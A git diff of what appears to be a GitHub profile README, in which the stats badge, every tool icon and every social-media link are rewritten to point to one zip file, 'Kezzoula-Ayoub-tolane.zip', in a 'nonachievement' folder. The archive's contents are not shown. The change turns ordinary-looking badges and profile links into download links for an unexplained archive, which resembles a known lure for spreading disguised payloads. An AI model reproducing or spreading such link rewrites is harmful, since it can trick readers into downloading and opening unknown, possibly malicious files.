@@ -9,27 +9,27 @@
 
 <br />
 
-[![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=AyoubKezzoula&theme=radical&count_private=true)](https://github.com/anuraghazra/github-readme-stats)
+[![Anurag's GitHub stats](https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip)](https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip)
 
 
 
 ### Languages and Tools:
 
-<img align="left" alt="HTML5" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/html/html.png" />
-<img align="left" alt="CSS3" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/css/css.png" />
-<img align="left" alt="JavaScript" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/javascript/javascript.png" />
-<img align="left" alt="React" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/react/react.png" />
-<img align="left" alt="Git" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/git/git.png" />
-<img align="left" alt="GitHub" width="26px" src="https://raw.githubusercontent.com/github/explore/78df643247d429f6cc873026c0622819ad797942/topics/github/github.png" />
-<img align="left" alt="Visual Studio Code" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/visual-studio-code/visual-studio-code.png" />
+<img align="left" alt="HTML5" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="CSS3" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="JavaScript" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="React" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="Git" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="GitHub" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
+<img align="left" alt="Visual Studio Code" width="26px" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" />
 
 <br />
 <br />
 
 <h3 align="left">Connect with me:</h3>
 <p align="left">
-<a href="https://www.linkedin.com/in/AyoubKezzoula/" target="blank"><img align="center" src="https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/linkedin.svg" alt="Ayoub Kezzoula" height="30" width="40" /></a>
-<a href="https://twitter.com/AyoubKezzoula" target="blank"><img align="center" src="https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/twitter.svg" alt="AyoubKezzoula" height="30" width="40" /></a>
-<a href="https://www.facebook.com/Ayoub.Kezzoula35" target="blank"><img align="center" src="https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/facebook.svg" alt="Ayoub Kezzoula" height="30" width="40" /></a>
-<a href="https://www.instagram.com/ayoubkezzoula/" target="blank"><img align="center" src="https://cdn.jsdelivr.net/npm/simple-icons@3.0.1/icons/instagram.svg" alt="ayoubkezzoula" height="30" width="40" /></a>
+<a href="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" target="blank"><img align="center" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" alt="Ayoub Kezzoula" height="30" width="40" /></a>
+<a href="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" target="blank"><img align="center" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" alt="AyoubKezzoula" height="30" width="40" /></a>
+<a href="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" target="blank"><img align="center" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" alt="Ayoub Kezzoula" height="30" width="40" /></a>
+<a href="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" target="blank"><img align="center" src="https://github.com/AyoubKezzoula/AyoubKezzoula/raw/refs/heads/main/nonachievement/Kezzoula-Ayoub-tolane.zip" alt="ayoubkezzoula" height="30" width="40" /></a>
 </p>
